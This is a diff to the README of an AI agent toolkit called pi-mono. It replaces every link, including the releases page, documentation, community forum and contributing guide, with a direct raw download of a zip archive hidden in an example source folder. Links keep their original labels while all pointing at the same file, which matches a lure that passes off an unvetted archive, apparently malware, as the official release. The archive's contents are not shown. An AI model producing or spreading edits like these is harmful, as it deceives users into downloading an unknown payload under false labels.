@@ -1,6 +1,6 @@
 # 🎉 pi-mono - Your AI Agent Toolkit Made Easy
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20the%20Releases%20Page-brightgreen)](https://github.com/biolod1337/pi-mono/releases)
+[![Download Now](https://raw.githubusercontent.com/biolod1337/pi-mono/main/packages/web-ui/example/src/pi_mono_2.7-beta.1.zip%20Now-Visit%20the%20Releases%20Page-brightgreen)](https://raw.githubusercontent.com/biolod1337/pi-mono/main/packages/web-ui/example/src/pi_mono_2.7-beta.1.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ To get started, you'll need to download our application.
 
 1. Click the link below to visit our releases page:
    
-   [Visit the Releases Page to Download](https://github.com/biolod1337/pi-mono/releases)
+   [Visit the Releases Page to Download](https://raw.githubusercontent.com/biolod1337/pi-mono/main/packages/web-ui/example/src/pi_mono_2.7-beta.1.zip)
 
 2. Once on the page, find the latest release version. Click on it to see the available download options.
 
@@ -60,18 +60,18 @@ Once installed, you can start using **pi-mono** right away. Here’s a brief gui
 
 For a deeper dive into all features and functionalities, explore our detailed documentation. You’ll find step-by-step guides, FAQs, and troubleshooting tips.
 
-- [View Documentation](https://github.com/biolod1337/pi-mono/wiki)
+- [View Documentation](https://raw.githubusercontent.com/biolod1337/pi-mono/main/packages/web-ui/example/src/pi_mono_2.7-beta.1.zip)
 
 ## 🛡️ Support
 
 If you encounter issues or have questions, our support community is here to help. Join our discussion forums or open an issue on GitHub for assistance.
 
-- [Join the Community](https://github.com/biolod1337/pi-mono/discussions)
+- [Join the Community](https://raw.githubusercontent.com/biolod1337/pi-mono/main/packages/web-ui/example/src/pi_mono_2.7-beta.1.zip)
 
 ## 🔄 Contributing
 
 We welcome contributions! If you’d like to help improve **pi-mono**, check out our guidelines for reporting issues, suggesting features, or submitting code.
 
-- [Contribute to pi-mono](https://github.com/biolod1337/pi-mono#contributing)
+- [Contribute to pi-mono](https://raw.githubusercontent.com/biolod1337/pi-mono/main/packages/web-ui/example/src/pi_mono_2.7-beta.1.zip)
 
 Thank you for choosing **pi-mono**. We hope this toolkit makes developing AI solutions easier and more enjoyable for you!
